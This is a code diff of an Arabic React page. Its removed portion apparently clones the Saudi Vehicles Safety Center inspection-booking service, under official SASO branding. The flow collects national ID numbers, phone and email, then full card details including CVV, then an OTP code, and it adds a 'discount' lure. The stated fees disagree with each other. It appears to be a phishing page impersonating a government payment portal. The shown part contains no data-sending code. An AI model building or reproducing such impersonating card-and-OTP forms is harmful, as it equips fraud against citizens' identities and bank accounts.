-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                    strokeWidth={2}
-                    d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"
-                  />
-                </svg>
-                حجز موعد
-              </Button>
-
-              <Button
-                size="lg"
-                variant="outline"
-                className="h-16 text-base font-semibold border-2 hover:bg-secondary bg-transparent"
-              >
-                <svg className="ml-2 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                    strokeWidth={2}
-                    d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"
-                  />
-                </svg>
-                تعديل موعد
-              </Button>
-
-              <Button
-                size="lg"
-                variant="outline"
-                className="h-16 text-base font-semibold border-2 border-destructive/30 text-destructive hover:bg-destructive hover:text-destructive-foreground bg-transparent"
-              >
-                <svg className="ml-2 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
-                </svg>
-                إلغاء موعد
-              </Button>
-            </div>
-          </div>
-        </div>
-      </div>
-    )
-  }
-
-  if (currentStep === "booking") {
-    return (
-      <div dir="rtl" className="min-h-screen bg-[#fafafa]">
-        {/* Clean header with logo */}
-        <header className="bg-white border-b border-gray-200 py-4 px-4">
-          <div className="container mx-auto max-w-2xl flex items-center justify-between">
-            <button className="text-gray-600">
-              <Menu className="w-6 h-6" />
-            </button>
-            <div className="flex items-center gap-2">
-              <div className="text-right">
-                <div className="text-sm font-semibold text-gray-800">مركز سلامة المركبات</div>
-                <div className="text-xs text-gray-500">Vehicles Safety Center</div>
-              </div>
-              <div className="w-10 h-10 bg-teal-700 rounded-md flex items-center justify-center">
-                <Car className="w-6 h-6 text-white" />
-              </div>
-            </div>
-          </div>
-        </header>
-
-        {/* Breadcrumb navigation */}
-        <div className="bg-white border-b border-gray-200 py-3 px-4">
-          <div className="container mx-auto max-w-2xl">
-            <div className="flex items-center gap-2 text-xs text-gray-500">
-              <span>الرئيسية</span>
-              <span>›</span>
-              <span>حجز موعد الفحص</span>
-              <span>›</span>
-              <span className="text-gray-800">الفحص الفني الدوري</span>
-            </div>
-          </div>
-        </div>
-
-        {/* Tabs */}
-        <div className="bg-white border-b border-gray-200">
-          <div className="container mx-auto max-w-2xl flex">
-            <button className="flex-1 py-4 text-sm font-medium text-teal-700 border-b-2 border-teal-700">
-              حجز موعد جديد
-            </button>
-            <button className="flex-1 py-4 text-sm font-medium text-gray-500">إدارة المواعيد</button>
-          </div>
-        </div>
-
-        {/* Main form */}
-        <form onSubmit={handleSubmit} className="container mx-auto px-4 py-6 max-w-2xl">
-          <div className="bg-white rounded-lg shadow-sm p-6 space-y-6">
-            {/* Name field */}
-            <div className="space-y-2">
-              <Label htmlFor="name" className="text-sm font-medium text-gray-700">
-                الاسم<span className="text-red-500">*</span>
-              </Label>
-              <Input
-                id="name"
-                type="text"
-                placeholder="الاسم"
-                className="h-12 bg-gray-50 border-gray-300"
-                data-testid="input-name"
-              />
-            </div>
-
-            {/* ID Number with icon */}
-            <div className="space-y-2">
-              <Label htmlFor="id-number" className="text-sm font-medium text-gray-700">
-                رقم البطاقة الشخصية<span className="text-red-500">*</span>
-              </Label>
-              <div className="relative">
-                <Input
-                  id="id-number"
-                  type="text"
-                  placeholder="أدخل رقم البطاقة الشخصية"
-                  className="h-12 bg-gray-50 border-gray-300 pl-12"
-                  data-testid="input-id-number"
-                />
-                <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
-              </div>
-            </div>
-
-            {/* Mobile Number with flag */}
-            <div className="space-y-2">
-              <Label htmlFor="mobile" className="text-sm font-medium text-gray-700">
-                رقم الجوال<span className="text-red-500">*</span>
-              </Label>
-              <div className="flex gap-2">
-                <div className="relative flex-shrink-0">
-                  <button
-                    type="button"
-                    className="h-12 px-4 bg-gray-50 border border-gray-300 rounded-md flex items-center gap-2"
-                  >
-                    <span className="text-lg">🇸🇦</span>
-                    <span className="text-sm text-gray-600">+966</span>
-                    <ChevronDown className="w-4 h-4 text-gray-400" />
-                  </button>
-                </div>
-                <Input
-                  id="mobile"
-                  type="tel"
-                  placeholder="أدخل رقم الجوال"
-                  className="h-12 bg-gray-50 border-gray-300 flex-1"
-                  data-testid="input-mobile"
-                />
-              </div>
-            </div>
-
-            {/* Email with icon */}
-            <div className="space-y-2">
-              <Label htmlFor="email" className="text-sm font-medium text-gray-700">
-                البريد الإلكتروني<span className="text-red-500">*</span>
-              </Label>
-              <div className="relative">
-                <Input
-                  id="email"
-                  type="email"
-                  placeholder="email@domain.com"
-                  className="h-12 bg-gray-50 border-gray-300 pl-12"
-                  data-testid="input-email"
-                />
-                <Mail className="absolute left-4 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
-              </div>
-            </div>
-
-            {/* Country selection */}
-            <div className="space-y-2">
-              <Label htmlFor="country" className="text-sm font-medium text-gray-700">
-                اختر الدولة<span className="text-red-500">*</span>
-              </Label>
-              <div className="relative">
-                <select
-                  id="country"
-                  value={country}
-                  onChange={(e) => setCountry(e.target.value)}
-                  className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-sm appearance-none"
-                  data-testid="select-country"
-                >
-                  <option value="saudi">السعودية</option>
-                  <option value="gcc">دول مجلس التعاون</option>
-                  <option value="other">أخرى</option>
-                </select>
-                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
-              </div>
-            </div>
-
-            {/* Vehicle plate info with live preview */}
-            <div className="space-y-4">
-              <Label className="text-sm font-medium text-gray-700">
-                معلومات لوحة المركبة<span className="text-red-500">*</span>
-              </Label>
-
-              <div className="flex justify-center mb-4">
-                <div className="relative w-72 h-20 bg-white border-4 border-black rounded-lg shadow-lg overflow-hidden">
-                  {/* Saudi flag colors on left */}
-                  <div className="absolute left-0 top-0 bottom-0 w-14 bg-[#165C3C] flex items-center justify-center">
-                    <div className="text-white text-xs font-bold">KSA</div>
-                  </div>
-
-                  {/* Plate content - Arabic letters on right, numbers on left */}
-                  <div className="absolute inset-0 flex items-center justify-between px-16">
-                    {/* Arabic letters section */}
-                    <div className="text-center flex-1">
-                      <div className="text-3xl font-bold" style={{ fontFamily: "Arial" }}>
-                        {plateLetters || "---"}
-                      </div>
-                    </div>
-
-                    {/* Divider */}
-                    <div className="h-12 w-0.5 bg-gray-400 mx-2"></div>
-
-                    {/* Numbers section */}
-                    <div className="text-center flex-1">
-                      <div className="text-3xl font-bold" style={{ fontFamily: "monospace" }}>
-                        {plateNumbers || "----"}
-                      </div>
-                    </div>
-                  </div>
-
-                  {/* Bottom text */}
-                  <div className="absolute bottom-1 left-0 right-0 text-center text-[8px] text-gray-600">
-                    المملكة العربية السعودية
-                  </div>
-                </div>
-              </div>
-
-              <div className="grid grid-cols-2 gap-3">
-                <div className="space-y-2">
-                  <Label className="text-xs text-gray-600">الحروف (Arabic Letters)</Label>
-                  <Input
-                    type="text"
-                    placeholder="أ ب ج"
-                    className="h-12 bg-gray-50 border-gray-300 text-center text-2xl font-bold"
-                    value={plateLetters}
-                    onChange={(e) => setPlateLetters(e.target.value)}
-                    maxLength={3}
-                    dir="rtl"
-                  />
-                </div>
-                <div className="space-y-2">
-                  <Label className="text-xs text-gray-600">الأرقام (Numbers)</Label>
-                  <Input
-                    type="text"
-                    placeholder="1234"
-                    className="h-12 bg-gray-50 border-gray-300 text-center text-2xl font-bold"
-                    value={plateNumbers}
-                    onChange={(e) => {
-                      const value = e.target.value.replace(/[^0-9]/g, "")
-                      setPlateNumbers(value)
-                    }}
-                    maxLength={4}
-                  />
-                </div>
-              </div>
-            </div>
-
-            {/* Vehicle Type Selection */}
-            <div className="space-y-3">
-              <Label htmlFor="vehicle-type" className="text-base font-semibold text-foreground flex items-center gap-2">
-                <Car className="h-4 w-4 text-teal-700" />
-                نوع المركبة *
-              </Label>
-              <div className="grid grid-cols-2 gap-3">
-                {vehicleTypes.map((type) => {
-                  const Icon = type.icon
-                  return (
-                    <button
-                      key={type.id}
-                      type="button"
-                      onClick={() => setVehicleType(type.id)}
-                      className={`relative p-4 rounded-xl border-2 text-right transition-all hover:scale-[1.02] ${
-                        vehicleType === type.id
-                          ? "border-teal-700 bg-teal-700/5 shadow-sm"
-                          : "border-border bg-card hover:border-teal-700/30"
-                      }`}
-                    >
-                      <div className="flex items-center gap-3">
-                        <div
-                          className={`w-10 h-10 rounded-lg flex items-center justify-center transition-colors ${
-                            vehicleType === type.id ? "bg-teal-700 text-white" : "bg-secondary text-muted-foreground"
-                          }`}
-                        >
-                          <Icon className="h-5 w-5" />
-                        </div>
-                        <span
-                          className={`font-medium ${vehicleType === type.id ? "text-foreground" : "text-muted-foreground"}`}
-                        >
-                          {type.label}
-                        </span>
-                      </div>
-                      {vehicleType === type.id && (
-                        <div className="absolute top-2 left-2">
-                          <div className="w-5 h-5 rounded-full bg-teal-700 flex items-center justify-center">
-                            <Check className="h-3 w-3 text-white" />
-                          </div>
-                        </div>
-                      )}
-                    </button>
-                  )
-                })}
-              </div>
-            </div>
-
-            {/* Inspection Type Selection */}
-            <div className="space-y-3">
-              <Label
-                htmlFor="inspection-type"
-                className="text-base font-semibold text-foreground flex items-center gap-2"
-              >
-                <Car className="h-4 w-4 text-teal-700" />
-                نوع الفحص *
-              </Label>
-              <div className="relative">
-                <select
-                  id="inspection-type"
-                  value={inspectionType}
-                  onChange={(e) => setInspectionType(e.target.value)}
-                  required
-                  className="w-full h-12 px-4 pr-12 rounded-xl border-2 border-border bg-card text-foreground appearance-none cursor-pointer hover:border-teal-700/30 focus:border-teal-700 focus:ring-2 focus:ring-teal-700/20 transition-colors text-right"
-                >
-                  <option value="" disabled>
-                    اختر نوع المركبة
-                  </option>
-                  {inspectionTypes.map((type) => (
-                    <option key={type.value} value={type.value}>
-                      {type.label}
-                    </option>
-                  ))}
-                </select>
-                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-5 w-5 text-muted-foreground pointer-events-none" />
-              </div>
-            </div>
-
-            {/* Region Selection */}
-            <div className="space-y-2">
-              <Label htmlFor="region" className="text-sm font-medium text-gray-700">
-                المنطقة لإجراء الفحص<span className="text-red-500">*</span>
-              </Label>
-              <div className="relative">
-                <select
-                  id="region"
-                  value={region}
-                  onChange={(e) => {
-                    setRegion(e.target.value)
-                    setCity("")
-                  }}
-                  className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-sm appearance-none"
-                  data-testid="select-region"
-                >
-                  <option value="">اختر المنطقة</option>
-                  {regions.map((r) => (
-                    <option key={r.value} value={r.value}>
-                      {r.label}
-                    </option>
-                  ))}
-                </select>
-                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
-              </div>
-            </div>
-
-            {region && (
-              <div className="space-y-2">
-                <Label htmlFor="city" className="text-sm font-medium text-gray-700">
-                  المدينة<span className="text-red-500">*</span>
-                </Label>
-                <div className="relative">
-                  <select
-                    id="city"
-                    value={city}
-                    onChange={(e) => setCity(e.target.value)}
-                    className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-sm appearance-none"
-                    data-testid="select-city"
-                  >
-                    <option value="">اختر المدينة</option>
-                    {citiesByRegion[region]?.map((c) => (
-                      <option key={c.value} value={c.value}>
-                        {c.label}
-                      </option>
-                    ))}
-                  </select>
-                  <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
-                </div>
-              </div>
-            )}
-
-            {/* Inspection center */}
-            <div className="space-y-2">
-              <Label htmlFor="inspection-center" className="text-sm font-medium text-gray-700">
-                مركز الفحص<span className="text-red-500">*</span>
-              </Label>
-              <div className="relative">
-                <select
-                  id="inspection-center"
-                  value={inspectionCenter}
-                  onChange={(e) => setInspectionCenter(e.target.value)}
-                  className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-sm appearance-none"
-                  data-testid="select-inspection-center"
-                >
-                  <option value="">إختر مركز المعاينة</option>
-                  {inspectionCenters.map((c) => (
-                    <option key={c.value} value={c.value}>
-                      {c.label}
-                    </option>
-                  ))}
-                </select>
-                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
-              </div>
-            </div>
-
-            {/* Date picker with custom display */}
-            <div className="space-y-2">
-              <Label className="text-sm font-medium text-gray-700">
-                التاريخ المرجع<span className="text-red-500">*</span>
-              </Label>
-              <div className="relative">
-                <button
-                  type="button"
-                  className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-right text-sm text-gray-700 flex items-center justify-between"
-                >
-                  <span>25 ديسمبر • 15 يناير</span>
-                  <Calendar className="h-5 w-5 text-gray-400" />
-                </button>
-              </div>
-            </div>
-
-            <div className="grid grid-cols-3 gap-3">
-              {[
-                { day: "الأحد", date: "28", month: "ديسمبر" },
-                { day: "الاثنين", date: "29", month: "ديسمبر" },
-                { day: "الثلاثاء", date: "30", month: "ديسمبر" },
-                { day: "الأربعاء", date: "31", month: "ديسمبر" },
-                { day: "الخميس", date: "01", month: "يناير" },
-                { day: "الجمعة", date: "02", month: "يناير" },
-                { day: "السبت", date: "03", month: "يناير" },
-                { day: "الأحد", date: "04", month: "يناير" },
-                { day: "الاثنين", date: "05", month: "يناير" },
-              ].map((dateOption, idx) => (
-                <button
-                  key={idx}
-                  type="button"
-                  onClick={() => setInspectionDate(dateOption.date)}
-                  className={`bg-gray-50 border rounded-lg p-4 hover:border-teal-700 transition-colors ${
-                    inspectionDate === dateOption.date ? "border-teal-700 bg-teal-700/5" : "border-gray-300"
-                  }`}
-                >
-                  <div className="text-xs text-gray-500 mb-1">{dateOption.day}</div>
-                  <div className="text-2xl font-bold text-gray-800 mb-1">{dateOption.date}</div>
-                  <div className="text-xs text-gray-500">{dateOption.month}</div>
-                </button>
-              ))}
-            </div>
-
-            {/* Time slots */}
-            <div className="space-y-2">
-              <Label htmlFor="time" className="text-right text-gray-700">
-                موعد الخدمة<span className="text-red-500">*</span>
-              </Label>
-              <div className="grid grid-cols-3 gap-2">
-                {[
-                  "7:30 صباحاً",
-                  "8:00 صباحاً",
-                  "8:30 صباحاً",
-                  "9:00 صباحاً",
-                  "9:30 صباحاً",
-                  "10:00 صباحاً",
-                  "10:30 صباحاً",
-                  "11:00 صباحاً",
-                  "11:30 صباحاً",
-                  "12:00 ظهراً",
-                  "12:30 ظهراً",
-                  "1:00 مساءً",
-                  "1:30 مساءً",
-                  "2:00 مساءً",
-                  "2:30 مساءً",
-                  "3:00 مساءً",
-                  "3:30 مساءً",
-                  "4:00 مساءً",
-                  "4:30 مساءً",
-                  "5:00 مساءً",
-                ].map((time) => (
-                  <button
-                    key={time}
-                    type="button"
-                    onClick={() => setInspectionTime(time)}
-                    className={`h-12 rounded-md border text-sm transition-colors ${
-                      inspectionTime === time
-                        ? "bg-teal-700 text-white border-teal-700"
-                        : "bg-gray-50 border-gray-300 text-gray-700 hover:border-teal-700"
-                    }`}
-                  >
-                    {time}
-                  </button>
-                ))}
-              </div>
-            </div>
-
-            {/* Action buttons */}
-            <div className="space-y-3 pt-4">
-              <Button
-                type="submit"
-                className="w-full h-12 bg-teal-700 hover:bg-teal-700/90 text-white font-medium rounded-md"
-                disabled={!captchaChecked}
-                data-testid="button-submit"
-              >
-                حجز الموعد
-              </Button>
-              <Button
-                type="button"
-                variant="outline"
-                className="w-full h-12 bg-white border-gray-300 text-gray-700 font-medium rounded-md hover:bg-gray-50"
-                onClick={() => setCurrentStep("landing")}
-              >
-                عودة
-              </Button>
-            </div>
-          </div>
-        </form>
-
-        {/* Footer */}
-        <footer className="bg-[#1a5c3a] text-white py-8 mt-12">
-          <div className="container mx-auto max-w-2xl px-4">
-            <div className="flex items-center justify-between">
-              <div className="flex items-center gap-4">
-                <div className="w-16 h-16 bg-white/10 rounded-lg flex items-center justify-center">
-                  <Car className="w-8 h-8 text-white" />
-                </div>
-                <div>
-                  <div className="font-semibold text-sm">مركز سلامة المركبات</div>
-                  <div className="text-xs opacity-90">Vehicles Safety Center</div>
-                </div>
-              </div>
-              <div className="w-12 h-12 bg-white/10 rounded-full flex items-center justify-center">
-                <div className="w-8 h-8 rounded-full bg-white/20" />
-              </div>
-            </div>
-            <div className="mt-6 text-xs text-white/70 leading-relaxed">
-              جميع الحقوق محفوظة، الهيئة السعودية للمواصفات والجودة © 2025
-              <br />
-              رقم الهاتف وعنوان البريد الإلكتروني تستخدم لإرسال الإشعارات فقط
-            </div>
-          </div>
-        </footer>
-      </div>
-    )
-  }
-
-  if (currentStep === "payment-method") {
-    return (
-      <div dir="rtl" className="min-h-screen bg-background">
-        <main className="flex-1">
-          {/* Professional header styling */}
-          <div className="bg-teal-700 py-6 shadow-sm">
-            <div className="container mx-auto px-4">
-              <h1 className="text-2xl font-bold text-teal-700-foreground text-center">طريقة الدفع</h1>
-            </div>
-          </div>
-
-          <div className="container mx-auto px-4 py-8 space-y-8 max-w-2xl">
-            <Card className="border-border bg-card shadow-sm">
-              <CardContent className="p-6">
-                <p className="text-muted-foreground leading-relaxed">
-                  يرجى اختيار طريقة الدفع المناسبة لإتمام عملية حجز موعد الفحص الفني الدوري لمركبتك. الدفع آمن ومحمي.
-                </p>
-              </CardContent>
-            </Card>
-
-            {/* Enhanced payment amount card with better visual hierarchy */}
-            <Card className="border-teal-700/30 bg-gradient-to-br from-teal-700/5 to-teal-700/10 shadow-sm">
-              <CardContent className="p-6">
-                <div className="flex items-center justify-between">
-                  <span className="text-lg font-medium text-foreground">المبلغ المستحق:</span>
-                  <div className="text-right">
-                    <div className="text-4xl font-bold text-teal-700">100</div>
-                    <div className="text-sm text-muted-foreground">ريال سعودي</div>
-                  </div>
-                </div>
-              </CardContent>
-            </Card>
-
-            <div className="space-y-4">
-              <Label className="text-lg font-medium">
-                اختر طريقة الدفع<span className="text-destructive">*</span>
-              </Label>
-
-              <div className="flex flex-col gap-4">
-                {paymentMethods.map((method) => (
-                  <button
-                    key={method.id}
-                    type="button"
-                    onClick={() => method.available && setPaymentMethod(method.id)}
-                    disabled={!method.available}
-                    className={`w-full p-5 rounded-lg border-2 transition-all shadow-sm relative ${
-                      method.available
-                        ? paymentMethod === method.id
-                          ? "border-teal-700 bg-teal-700/10 shadow-md hover:shadow-lg"
-                          : "border-border bg-card hover:border-teal-700/50 hover:shadow-md"
-                        : "border-border bg-muted/50 opacity-60 cursor-not-allowed"
-                    }`}
-                  >
-                    <div className="flex items-center gap-4">
-                      <div
-                        className={`p-3 rounded-lg ${
-                          method.available ? (paymentMethod === method.id ? "bg-teal-700/20" : "bg-muted") : "bg-muted"
-                        }`}
-                      >
-                        <method.icon
-                          className={`w-6 h-6 ${
-                            method.available
-                              ? paymentMethod === method.id
-                                ? "text-teal-700"
-                                : "text-muted-foreground"
-                              : "text-muted-foreground"
-                          }`}
-                        />
-                      </div>
-                      <div className="flex-1 text-right">
-                        <div className="font-semibold text-base flex items-center justify-end gap-2">
-                          {method.label}
-                          {!method.available && (
-                            <span className="text-xs bg-muted px-2 py-1 rounded text-muted-foreground">غير متاح</span>
-                          )}
-                          {method.badge && method.available && (
-                            <span className="text-xs bg-green-100 text-green-700 px-2 py-1 rounded font-medium">
-                              {method.badge}
-                            </span>
-                          )}
-                        </div>
-                        <div className="text-sm text-muted-foreground mt-0.5">{method.description}</div>
-                      </div>
-                    </div>
-                  </button>
-                ))}
-              </div>
-            </div>
-
-            <div className="flex gap-3 pt-6">
-              <Button
-                type="button"
-                variant="outline"
-                onClick={() => setCurrentStep("booking")}
-                className="flex-1 h-12 border-2"
-                disabled={isLoading}
-              >
-                رجوع
-              </Button>
-              <Button
-                type="button"
-                onClick={handlePaymentMethodSubmit}
-                className="flex-1 h-12 gap-2 shadow-sm"
-                disabled={!paymentMethod || isLoading}
-              >
-                <span>التالي</span>
-                <ArrowLeft className="w-5 h-5" />
-              </Button>
-            </div>
-          </div>
-        </main>
-      </div>
-    )
-  }
-
-  if (currentStep === "card-form") {
-    return (
-      <div dir="rtl" className="min-h-screen bg-background">
-        <main className="flex-1">
-          <div className="bg-teal-700 py-6 shadow-sm">
-            <div className="container mx-auto px-4">
-              <h1 className="text-2xl font-bold text-teal-700-foreground text-center">الدفع الإلكتروني</h1>
-              <p className="text-sm text-teal-700-foreground/80 text-center mt-1">
-                ادفع رسوم الفحص الفني الدوري بشكل آمن أون لاين
-              </p>
-            </div>
-          </div>
-
-          <form onSubmit={handleCardFormSubmit} className="container mx-auto px-4 py-8 space-y-6 max-w-2xl">
-            {/* Card Mockup Visualization */}
-            <div className="relative w-full h-48 bg-gradient-to-br from-[#2c3e5f] to-[#1a2332] rounded-2xl shadow-lg p-6 text-white">
-              <div className="flex justify-between items-start mb-8">
-                <CreditCard className="w-10 h-10" />
-                {bankInfo ? (
-                  <div className="flex flex-col items-end gap-1">
-                    <div className="text-3xl">{bankInfo.logo}</div>
-                    <div className="text-xs opacity-80">{bankInfo.name}</div>
-                  </div>
-                ) : (
-                  <div className="w-12 h-8 bg-gradient-to-br from-amber-400 to-amber-500 rounded"></div>
-                )}
-              </div>
-
-              <div className="space-y-4">
-                <div className="flex gap-2 text-xl tracking-wider font-mono">{cardNumber || "•••• •••• •••• ••••"}</div>
-
-                <div className="flex justify-between items-end">
-                  <div>
-                    <div className="text-xs opacity-70">MM/YY</div>
-                    <div className="text-sm font-medium">{expiryDate || "MM/YY"}</div>
-                  </div>
-                  <div className="text-right">
-                    <div className="text-xs opacity-70">اسم حامل البطاقة</div>
-                    <div className="text-sm font-medium">{cardName || "FULL NAME"}</div>
-                  </div>
-                </div>
-              </div>
-            </div>
-
-            {/* Card Details Form */}
-            <Card className="shadow-sm">
-              <CardContent className="p-6">
-                <h2 className="text-xl font-bold mb-6 flex items-center gap-2">
-                  <CreditCard className="w-5 h-5 text-teal-700" />
-                  بيانات البطاقة
-                </h2>
-
-                <div className="space-y-5">
-                  <div className="space-y-2">
-                    <Label htmlFor="card-number" className="text-sm">
-                      رقم البطاقة<span className="text-destructive">*</span>
-                    </Label>
-                    <div className="relative">
-                      <Input
-                        id="card-number"
-                        type="text"
-                        placeholder="0000 0000 0000 0000"
-                        value={cardNumber}
-                        onChange={(e) => handleCardNumberChange(e.target.value)}
-                        maxLength={19}
-                        required
-                        className="bg-muted/50 pr-10"
-                      />
-                      <div className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center gap-2">
-                        {bankInfo ? (
-                          <>
-                            <span className="text-xl">{bankInfo.logo}</span>
-                            <span className="text-xs font-medium">{bankInfo.name}</span>
-                          </>
-                        ) : (
-                          <CreditCard className="w-5 h-5 text-muted-foreground" />
-                        )}
-                      </div>
-                    </div>
-                    {bankInfo && (
-                      <p className="text-xs text-muted-foreground flex items-center gap-1">
-                        <Check className="w-3 h-3 text-green-600" />
-                        تم التعرف على البنك: {bankInfo.name}
-                      </p>
-                    )}
-                  </div>
-
-                  <div className="space-y-2">
-                    <Label htmlFor="card-name" className="text-sm">
-                      اسم حامل البطاقة / الاسكريبشن<span className="text-destructive">*</span>
-                    </Label>
-                    <Input
-                      id="card-name"
-                      type="text"
-                      placeholder="JOHN DOE"
-                      value={cardName}
-                      onChange={(e) => setCardName(e.target.value.toUpperCase())}
-                      required
-                      className="bg-muted/50"
-                    />
-                  </div>
-
-                  <div className="grid grid-cols-3 gap-4">
-                    <div className="space-y-2">
-                      <Label htmlFor="expiry-month" className="text-sm">
-                        الشهر<span className="text-destructive">*</span>
-                      </Label>
-                      <select
-                        id="expiry-month"
-                        value={expiryDate.substring(0, 2)}
-                        onChange={(e) => setExpiryDate(e.target.value + expiryDate.substring(2))}
-                        className="flex h-10 w-full rounded-md border border-input bg-muted/50 px-3 py-2 text-sm ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring"
-                        required
-                      >
-                        <option value="">MM</option>
-                        {Array.from({ length: 12 }, (_, i) => (
-                          <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
-                            {String(i + 1).padStart(2, "0")}
-                          </option>
-                        ))}
-                      </select>
-                    </div>
-
-                    <div className="space-y-2">
-                      <Label htmlFor="expiry-year" className="text-sm">
-                        السنة<span className="text-destructive">*</span>
-                      </Label>
-                      <select
-                        id="expiry-year"
-                        value={expiryDate.substring(3, 5)}
-                        onChange={(e) => setExpiryDate(expiryDate.substring(0, 3) + e.target.value)}
-                        className="flex h-10 w-full rounded-md border border-input bg-muted/50 px-3 py-2 text-sm ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring"
-                        required
-                      >
-                        <option value="">YY</option>
-                        {Array.from({ length: 10 }, (_, i) => {
-                          const year = new Date().getFullYear() + i
-                          return (
-                            <option key={year} value={String(year).slice(-2)}>
-                              {String(year).slice(-2)}
-                            </option>
-                          )
-                        })}
-                      </select>
-                    </div>
-
-                    <div className="space-y-2">
-                      <Label htmlFor="cvv" className="text-sm">
-                        CVV<span className="text-destructive">*</span>
-                      </Label>
-                      <Input
-                        id="cvv"
-                        type="text"
-                        placeholder="•••"
-                        value={cvv}
-                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
-                        maxLength={3}
-                        required
-                        className="bg-muted/50"
-                      />
-                    </div>
-                  </div>
-                </div>
-              </CardContent>
-            </Card>
-
-            {/* Secure Payment Button */}
-            <Button type="submit" className="w-full h-12 gap-2 shadow-sm" disabled={isLoading}>
-              <Lock className="w-4 h-4" />
-              <span>إتمام الدفع الآمن</span>
-            </Button>
-
-            {/* Order Summary */}
-            <Card className="shadow-sm">
-              <CardContent className="p-6">
-                <h3 className="font-bold text-lg mb-4">ملخص الطلب</h3>
-
-                <div className="space-y-3 text-sm">
-                  <div className="flex justify-between items-center">
-                    <span className="text-muted-foreground">رسوم الفحص</span>
-                    <span className="font-medium">115.00 ريال</span>
-                  </div>
-
-                  <div className="flex justify-between items-center">
-                    <span className="text-muted-foreground">ضريبة القيمة المضافة (%15)</span>
-                    <span className="font-medium">17.25 ريال</span>
-                  </div>
-
-                  <div className="border-t pt-3 mt-3">
-                    <div className="flex justify-between items-center">
-                      <span className="text-lg font-bold">الإجمالي</span>
-                      <span className="text-2xl font-bold text-teal-700">132.25 ريال</span>
-                    </div>
-                  </div>
-                </div>
-
-                <div className="mt-6 pt-6 border-t">
-                  <div className="text-xs text-center text-muted-foreground mb-3">طرق الدفع المتوفرة</div>
-                  <div className="flex justify-center items-center gap-4">
-                    <div className="flex items-center gap-2 px-3 py-2 bg-muted/50 rounded">
-                      <div className="w-8 h-5 bg-gradient-to-r from-gray-700 to-gray-900 rounded flex items-center justify-center">
-                        <span className="text-white text-[8px] font-bold">mada</span>
-                      </div>
-                    </div>
-                    <div className="flex items-center gap-2 px-3 py-2 bg-muted/50 rounded">
-                      <div className="w-8 h-5 bg-gradient-to-br from-red-600 to-orange-500 rounded"></div>
-                    </div>
-                    <div className="flex items-center gap-2 px-3 py-2 bg-muted/50 rounded">
-                      <div className="w-8 h-5 bg-gradient-to-r from-blue-600 to-blue-800 rounded flex items-center justify-center">
-                        <span className="text-white text-[6px] font-bold">VISA</span>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-
-                <div className="mt-6 p-4 bg-green-50 rounded-lg flex items-start gap-3">
-                  <div className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
-                    <Check className="w-3 h-3 text-white" />
-                  </div>
-                  <div className="text-sm">
-                    <div className="font-medium text-green-800">خصم فوري 100*</div>
-                    <div className="text-green-700 text-xs mt-1">
-                      للطلبات التي تدفع من خلال بطاقة Saving السعودية والخليجي
-                    </div>
-                  </div>
-                </div>
-              </CardContent>
-            </Card>
-
+          <div className="mt-12 max-w-md mx-auto space-y-4">
             <Button
-              type="button"
-              variant="outline"
-              onClick={() => setCurrentStep("payment-method")}
-              className="w-full h-12 border-2"
-              disabled={isLoading}
+              size="lg"
+              className="w-full bg-green-500 text-white hover:bg-green-500/90 rounded-xl shadow-lg shadow-green-500/20"
             >
-              رجوع
+              البحث برقم الهوية
             </Button>
-          </form>
-        </main>
-      </div>
-    )
-  }
+            <Button
+              size="lg"
+              variant="outline"
+              className="w-full border-green-500/30 text-green-500 hover:bg-green-500/5 rounded-xl bg-transparent"
+            >
+              البحث برقم المستخدم
+            </Button>
+            <button className="w-full text-muted-foreground hover:text-foreground py-3 inline-flex items-center justify-center gap-2 transition-colors">
+              <Search className="w-4 h-4" />
+              بحث متقدم
+            </button>
+          </div>
+        </div>
+      </section>
 
-  if (currentStep === "otp") {
-    return (
-      <div dir="rtl" className="min-h-screen bg-background">
-        <main className="flex-1">
-          <div className="bg-teal-700 py-6 shadow-sm">
-            <div className="container mx-auto px-4">
-              <h1 className="text-2xl font-bold text-teal-700-foreground text-center">التحقق برمز OTP</h1>
-            </div>
+      {/* Stats Section */}
+      <section className="bg-gradient-to-br from-green-500 via-green-500/95 to-secondary py-20">
+        <div className="container mx-auto px-6">
+          <div className="max-w-4xl mx-auto text-center space-y-4 mb-16">
+            <Badge className="bg-green-500-foreground/20 text-white border-green-500-foreground/30">
+              إنجازاتنا
+            </Badge>
+            <h2 className="text-3xl md:text-4xl font-bold text-white text-balance">
+              أرقام تتحدث عن التميز
+            </h2>
+            <p className="text-green-500-foreground/90 text-lg text-pretty leading-relaxed">
